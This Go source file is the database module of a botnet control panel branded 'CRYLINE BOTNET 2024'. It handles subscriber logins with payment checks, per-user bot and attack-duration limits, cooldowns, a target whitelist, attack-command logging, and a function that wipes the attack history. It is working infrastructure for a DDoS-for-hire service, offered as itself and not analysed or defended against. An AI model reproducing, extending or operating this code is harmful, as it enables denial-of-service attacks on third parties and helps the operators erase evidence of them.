/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

package main

import (
    "database/sql"
    "fmt"
    "net"
    "encoding/binary"
    _ "github.com/go-sql-driver/mysql"
    "time"
    "errors"
)

type Database struct {
    __GET_DATABASE *sql.DB
}

type AccountInfo struct {
    _USER_NAME string
    _MAX_BOTNET_AGENTS int
    _ADMIN_USER int
}

func __BOTNET_DATABASE(_MYSQL_ADDRESS string, _MYSQL_USER string, _MYSQL_PASSWORD string, _DATABASE string) *Database {
    
    __GET_DATABASE, _GET_ERROR := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", _MYSQL_USER, _MYSQL_PASSWORD, _MYSQL_ADDRESS, _DATABASE))

    if _GET_ERROR != nil {
        fmt.Println(_GET_ERROR)
    }

    fmt.Println("░█████╗░██████╗░██╗░░░██╗██╗░░░░░██╗███╗░░██╗███████╗")
    fmt.Println("██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██║████╗░██║██╔════╝")
    fmt.Println("██║░░╚═╝██████╔╝░╚████╔╝░██║░░░░░██║██╔██╗██║█████╗░░")
    fmt.Println("██║░░██╗██╔══██╗░░╚██╔╝░░██║░░░░░██║██║╚████║██╔══╝░░")
    fmt.Println("╚█████╔╝██║░░██║░░░██║░░░███████╗██║██║░╚███║███████╗")
    fmt.Println("░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚═╝░░╚══╝╚══════╝")

    return &Database{__GET_DATABASE}
}

func (_THIS *Database) __LOGIN(_USER_NAME string, _PASSWORD string) (bool, AccountInfo) {
    
    _GET_MYSQL_ROWS, _GET_ERROR := _THIS.__GET_DATABASE.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", _USER_NAME, _PASSWORD)
    
    if _GET_ERROR != nil {
        fmt.Println(_GET_ERROR)

        return false, AccountInfo{"", 0, 0}
    }

    defer _GET_MYSQL_ROWS.Close()

    if !_GET_MYSQL_ROWS.Next() {
        return false, AccountInfo{"", 0, 0}
    }

    var _ACCOUNT_INFO AccountInfo

    _GET_MYSQL_ROWS.Scan(&_ACCOUNT_INFO._USER_NAME, &_ACCOUNT_INFO._MAX_BOTNET_AGENTS, &_ACCOUNT_INFO._ADMIN_USER)

    return true, _ACCOUNT_INFO
}

func (_THIS *Database) __CLEAN_LOGS() (bool) {
    _GET_MYSQL_ROWS, _GET_ERROR := _THIS.__GET_DATABASE.Query("DELETE FROM history")

    if _GET_ERROR != nil {
        fmt.Println(_GET_ERROR)

        return false
    }

    if _GET_MYSQL_ROWS.Next() {
        return false
    }

    _THIS.__GET_DATABASE.Exec("DELETE FROM history")

    return true
}

func (_THIS *Database) __CHECK_WHITE_LISTED_TARGETS(_ATTACK *__ATTACK) bool {
    _GET_MYSQL_ROWS, _GET_ERROR := _THIS.__GET_DATABASE.Query("SELECT prefix, netmask FROM whitelist")

    if _GET_ERROR != nil {
        fmt.Println(_GET_ERROR)
        return false
    }

    defer _GET_MYSQL_ROWS.Close()

    for _GET_MYSQL_ROWS.Next() {
        var _PREFIX string
        var _NETMASK uint8

        _GET_MYSQL_ROWS.Scan(&_PREFIX, &_NETMASK)

        _GET_IP := net.ParseIP(_PREFIX)
        _GET_IP = _GET_IP[12:]

        _WHITE_LIST_PREFIX := binary.BigEndian.Uint32(_GET_IP)

        for _GET_NETWORK, GET_LOCAL_SETTER := range _ATTACK._TARGETS {
            _GET_LOCAL_BUFFER := make([]byte, 4)

            binary.BigEndian.PutUint32(_GET_LOCAL_BUFFER, _GET_NETWORK)

            _GET_ATTACK_PREFIX := binary.BigEndian.Uint32(_GET_LOCAL_BUFFER)

            if GET_LOCAL_SETTER > _NETMASK {
                if __NET_MASKED(_WHITE_LIST_PREFIX, _NETMASK) == __NET_MASKED(_GET_ATTACK_PREFIX, _NETMASK) {
                    return true
                }
            } else if GET_LOCAL_SETTER < _NETMASK {
                if (_GET_ATTACK_PREFIX >> GET_LOCAL_SETTER) == (_WHITE_LIST_PREFIX >> GET_LOCAL_SETTER) {
                    return true
                }
            } else {
                if (_WHITE_LIST_PREFIX == _GET_ATTACK_PREFIX) {
                    return true
                }
            }
        }
    }
    return false
}

func (_THIS *Database) __ATTACK_LAUNCH(_USER_NAME string, _DURATION uint32, _COMMAND string, _MAX_BOTNET_AGENTS int, _ALLOW int) (bool, error) {
    _GET_MYSQL_ROWS, _GET_ERROR := _THIS.__GET_DATABASE.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", _USER_NAME)

    defer _GET_MYSQL_ROWS.Close()

    if _GET_ERROR != nil {
        fmt.Println(_GET_ERROR)
    }

    var _USER_ID, _DURATION_LIMIT, _ADMIN_USER, _TIMEOUT uint32

    if !_GET_MYSQL_ROWS.Next() {
        return false, errors.New("[-] Your access has been terminated!\n")
    }

    _GET_MYSQL_ROWS.Scan(&_USER_ID, &_DURATION_LIMIT, &_ADMIN_USER, &_TIMEOUT)

    if _DURATION_LIMIT != 0 && _DURATION > _DURATION_LIMIT {
        return false, errors.New(fmt.Sprintf("[-] You may not send attacks longer than %d seconds\n", _DURATION_LIMIT))
    }

    _GET_MYSQL_ROWS.Close()

    if _ADMIN_USER == 0 {
        _GET_MYSQL_ROWS, _GET_ERROR = _THIS.__GET_DATABASE.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", _USER_ID, _TIMEOUT)
        
        if _GET_ERROR != nil {
            fmt.Println(_GET_ERROR)
        }

        if _GET_MYSQL_ROWS.Next() {
            var timeSent, historyDuration uint32

            _GET_MYSQL_ROWS.Scan(&timeSent, &historyDuration)

            return false, errors.New(fmt.Sprintf("[-] Please wait %d seconds before sending another attack!\n", (timeSent + historyDuration + _TIMEOUT) - uint32(time.Now().Unix())))
        }
    }

    _THIS.__GET_DATABASE.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", _USER_ID, _DURATION, _COMMAND, _MAX_BOTNET_AGENTS)
    
    return true, nil
}
